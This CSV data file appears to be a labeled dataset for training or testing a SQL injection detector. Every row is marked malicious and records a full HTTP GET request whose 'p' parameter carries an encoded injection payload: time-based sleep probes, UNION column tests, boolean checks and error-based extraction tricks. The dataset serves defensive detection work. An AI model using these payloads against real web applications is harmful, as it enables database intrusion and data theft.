"id","label","source","source_url","method","url","path","query_string","headers","body","raw_request","notes"
"pos_modsec_learn_sqli_002023","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++as+kiqk+where+7366++%3D++7366+and+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++gcrr++%29++%23","/","p=1+++%29++++%29++++as+kiqk+where+7366++%3D++7366+and+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++gcrr++%29++%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++as+kiqk+where+7366++%3D++7366+and+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++gcrr++%29++%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002024","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++as+potk+where+5040++%3D++5040+or+elt++%28++5873++%3D++5873%2Csleep++%28++5+++%29++++%29+++%23","/","p=1+++%29++++%29++++as+potk+where+5040++%3D++5040+or+elt++%28++5873++%3D++5873%2Csleep++%28++5+++%29++++%29+++%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++as+potk+where+5040++%3D++5040+or+elt++%28++5873++%3D++5873%2Csleep++%28++5+++%29++++%29+++%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002025","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++as+rcbz+where+4563++%3D++4563+and+2006++%3D++2006","/","p=1+++%29++++%29++++as+rcbz+where+4563++%3D++4563+and+2006++%3D++2006","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++as+rcbz+where+4563++%3D++4563+and+2006++%3D++2006 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002026","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++as+smtf+where+5829++%3D++5829","/","p=1+++%29++++%29++++as+smtf+where+5829++%3D++5829","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++as+smtf+where+5829++%3D++5829 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002027","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++as+sxhg+where+7697++%3D++7697+or+char++%28++117++%29++%7C%7Cchar++%28++111++%29++%7C%7Cchar++%28++105++%29++%7C%7Cchar++%28++100++%29++++%3D++regexp_substring++%28++repeat++%28++left++%28++crypt_key++%28++char++%28++65++%29++%7C%7Cchar++%28++69++%29++%7C%7Cchar++%28++83++%29++%2Cnull++%29++%2C0++%29++%2C500000000++%29++%2Cnull++%29++--","/","p=1+++%29++++%29++++as+sxhg+where+7697++%3D++7697+or+char++%28++117++%29++%7C%7Cchar++%28++111++%29++%7C%7Cchar++%28++105++%29++%7C%7Cchar++%28++100++%29++++%3D++regexp_substring++%28++repeat++%28++left++%28++crypt_key++%28++char++%28++65++%29++%7C%7Cchar++%28++69++%29++%7C%7Cchar++%28++83++%29++%2Cnull++%29++%2C0++%29++%2C500000000++%29++%2Cnull++%29++--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++as+sxhg+where+7697++%3D++7697+or+char++%28++117++%29++%7C%7Cchar++%28++111++%29++%7C%7Cchar++%28++105++%29++%7C%7Cchar++%28++100++%29++++%3D++regexp_substring++%28++repeat++%28++left++%28++crypt_key++%28++char++%28++65++%29++%7C%7Cchar++%28++69++%29++%7C%7Cchar++%28++83++%29++%2Cnull++%29++%2C0++%29++%2C500000000++%29++%2Cnull++%29++-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002028","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++as+tbiq+where+7159++%3D++7159+and+8635++%3D++++%28++select+count++%28++%2A++%29+++from+generate_series++%28++1%2C5000000+++%29++++%29+++--","/","p=1+++%29++++%29++++as+tbiq+where+7159++%3D++7159+and+8635++%3D++++%28++select+count++%28++%2A++%29+++from+generate_series++%28++1%2C5000000+++%29++++%29+++--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++as+tbiq+where+7159++%3D++7159+and+8635++%3D++++%28++select+count++%28++%2A++%29+++from+generate_series++%28++1%2C5000000+++%29++++%29+++-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002029","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++as+uizx+where+2512++%3D++2512+and+make_set++%28++1402++%3D++2908%2C2908++%29++--","/","p=1+++%29++++%29++++as+uizx+where+2512++%3D++2512+and+make_set++%28++1402++%3D++2908%2C2908++%29++--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++as+uizx+where+2512++%3D++2512+and+make_set++%28++1402++%3D++2908%2C2908++%29++-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002030","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++as+uqsi+where+1644++%3D++1644+and+9198++%3D++9198--","/","p=1+++%29++++%29++++as+uqsi+where+1644++%3D++1644+and+9198++%3D++9198--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++as+uqsi+where+1644++%3D++1644+and+9198++%3D++9198-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002031","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++as+xoch+where+8765++%3D++8765+and+3754++%3D++++%28++select+upper++%28++xmltype++%28++chr++%28++60++%29++%7C%7Cchr++%28++58++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++3754++%3D++3754++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++62+++%29++++%29+++++%29+++from+dual++%29++--","/","p=1+++%29++++%29++++as+xoch+where+8765++%3D++8765+and+3754++%3D++++%28++select+upper++%28++xmltype++%28++chr++%28++60++%29++%7C%7Cchr++%28++58++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++3754++%3D++3754++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++62+++%29++++%29+++++%29+++from+dual++%29++--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++as+xoch+where+8765++%3D++8765+and+3754++%3D++++%28++select+upper++%28++xmltype++%28++chr++%28++60++%29++%7C%7Cchr++%28++58++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++3754++%3D++3754++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++62+++%29++++%29+++++%29+++from+dual++%29++-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002032","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++as+zmsa+where+6909++%3D++6909+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23","/","p=1+++%29++++%29++++as+zmsa+where+6909++%3D++6909+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++as+zmsa+where+6909++%3D++6909+union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002033","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++as+zoso+where+3633++%3D++3633","/","p=1+++%29++++%29++++as+zoso+where+3633++%3D++3633","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++as+zoso+where+3633++%3D++3633 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002034","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++as+zpvn+where+2767++%3D++2767+rlike+++%28++select+++%28++case+when+++%28++7689++%3D++7689++%29+++then+1+else+0x28+end+++%29++++%29+++--","/","p=1+++%29++++%29++++as+zpvn+where+2767++%3D++2767+rlike+++%28++select+++%28++case+when+++%28++7689++%3D++7689++%29+++then+1+else+0x28+end+++%29++++%29+++--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++as+zpvn+where+2767++%3D++2767+rlike+++%28++select+++%28++case+when+++%28++7689++%3D++7689++%29+++then+1+else+0x28+end+++%29++++%29+++-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002035","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++or+5356++%3D++++%28++select+count++%28++%2A++%29+++from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7++%29++--","/","p=1+++%29++++%29++++or+5356++%3D++++%28++select+count++%28++%2A++%29+++from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7++%29++--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++or+5356++%3D++++%28++select+count++%28++%2A++%29+++from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7++%29++-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002036","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++or+6979++%3D++like++%28++%27abcdefg%27%2Cupper++%28++hex++%28++randomblob++%28++500000000%2F2+++%29++++%29++++++%29++++%29+++--","/","p=1+++%29++++%29++++or+6979++%3D++like++%28++%27abcdefg%27%2Cupper++%28++hex++%28++randomblob++%28++500000000%2F2+++%29++++%29++++++%29++++%29+++--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++or+6979++%3D++like++%28++%27abcdefg%27%2Cupper++%28++hex++%28++randomblob++%28++500000000%2F2+++%29++++%29++++++%29++++%29+++-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002037","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++or+9643++%3D++++%28++select+count++%28++%2A++%29+++from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3++%29+++and++++%28++++%28+++5888++%3D++5888","/","p=1+++%29++++%29++++or+9643++%3D++++%28++select+count++%28++%2A++%29+++from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3++%29+++and++++%28++++%28+++5888++%3D++5888","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++or+9643++%3D++++%28++select+count++%28++%2A++%29+++from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3++%29+++and++++%28++++%28+++5888++%3D++5888 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002038","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++or+elt++%28++6272++%3D++6272%2Csleep++%28++5+++%29++++%29++++and++++%28++++%28+++8024++%3D++8024","/","p=1+++%29++++%29++++or+elt++%28++6272++%3D++6272%2Csleep++%28++5+++%29++++%29++++and++++%28++++%28+++8024++%3D++8024","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++or+elt++%28++6272++%3D++6272%2Csleep++%28++5+++%29++++%29++++and++++%28++++%28+++8024++%3D++8024 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002039","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++or+sleep++%28++5++%29++%23","/","p=1+++%29++++%29++++or+sleep++%28++5++%29++%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++or+sleep++%28++5++%29++%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002040","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--","/","p=1+++%29++++%29++++union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002041","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+++%29++++%29++++union+all+select+null--","/","p=1+++%29++++%29++++union+all+select+null--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+++%29++++%29++++union+all+select+null-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002042","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+and+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++fzno++%29+","/","p=1+and+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++fzno++%29+","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+and+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++fzno++%29+ HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002043","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+and+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++fzno++%29++%23+bkjl","/","p=1+and+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++fzno++%29++%23+bkjl","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+and+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++fzno++%29++%23+bkjl HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002044","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+and+++%28++select+9067+from++%28++select+count++%28++%2A++%29++%2Cconcat++%28++0x7171706a71%2C++%28++select+++%28++elt++%28++9067++%3D++9067%2C1+++%29++++%29+++++%29++%2C0x717a767a71%2Cfloor++%28++rand++%28++0++%29++%2A2+++%29++++%29+++x+from+information_schema.character_sets+group+by+x++%29++a++%29++%23+myqr","/","p=1+and+++%28++select+9067+from++%28++select+count++%28++%2A++%29++%2Cconcat++%28++0x7171706a71%2C++%28++select+++%28++elt++%28++9067++%3D++9067%2C1+++%29++++%29+++++%29++%2C0x717a767a71%2Cfloor++%28++rand++%28++0++%29++%2A2+++%29++++%29+++x+from+information_schema.character_sets+group+by+x++%29++a++%29++%23+myqr","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+and+++%28++select+9067+from++%28++select+count++%28++%2A++%29++%2Cconcat++%28++0x7171706a71%2C++%28++select+++%28++elt++%28++9067++%3D++9067%2C1+++%29++++%29+++++%29++%2C0x717a767a71%2Cfloor++%28++rand++%28++0++%29++%2A2+++%29++++%29+++x+from+information_schema.character_sets+group+by+x++%29++a++%29++%23+myqr HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002045","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+and+2853++%3D++cast+++%28++++%28+++chr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113+++%29++++%29+++%7C%7C++%28++select+++%28++case+when+++%28++2853++%3D++2853++%29+++then+1+else+0+end+++%29++++%29+++%3A%3Atext%7C%7C++%28++chr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113+++%29++++%29++++as+numeric++%29+","/","p=1+and+2853++%3D++cast+++%28++++%28+++chr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113+++%29++++%29+++%7C%7C++%28++select+++%28++case+when+++%28++2853++%3D++2853++%29+++then+1+else+0+end+++%29++++%29+++%3A%3Atext%7C%7C++%28++chr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113+++%29++++%29++++as+numeric++%29+","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+and+2853++%3D++cast+++%28++++%28+++chr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113+++%29++++%29+++%7C%7C++%28++select+++%28++case+when+++%28++2853++%3D++2853++%29+++then+1+else+0+end+++%29++++%29+++%3A%3Atext%7C%7C++%28++chr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113+++%29++++%29++++as+numeric++%29+ HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002046","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+and+3754++%3D++++%28++select+upper++%28++xmltype++%28++chr++%28++60++%29++%7C%7Cchr++%28++58++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++3754++%3D++3754++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++62+++%29++++%29+++++%29+++from+dual++%29++%23+sipo","/","p=1+and+3754++%3D++++%28++select+upper++%28++xmltype++%28++chr++%28++60++%29++%7C%7Cchr++%28++58++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++3754++%3D++3754++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++62+++%29++++%29+++++%29+++from+dual++%29++%23+sipo","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+and+3754++%3D++++%28++select+upper++%28++xmltype++%28++chr++%28++60++%29++%7C%7Cchr++%28++58++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++3754++%3D++3754++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++62+++%29++++%29+++++%29+++from+dual++%29++%23+sipo HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002047","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+and+4595++%3D++4595%23","/","p=1+and+4595++%3D++4595%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+and+4595++%3D++4595%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002048","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+and+5556++%3D++++%28++select+count++%28++%2A++%29+++from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5++%29++%23+zwck","/","p=1+and+5556++%3D++++%28++select+count++%28++%2A++%29+++from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5++%29++%23+zwck","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+and+5556++%3D++++%28++select+count++%28++%2A++%29+++from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5++%29++%23+zwck HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
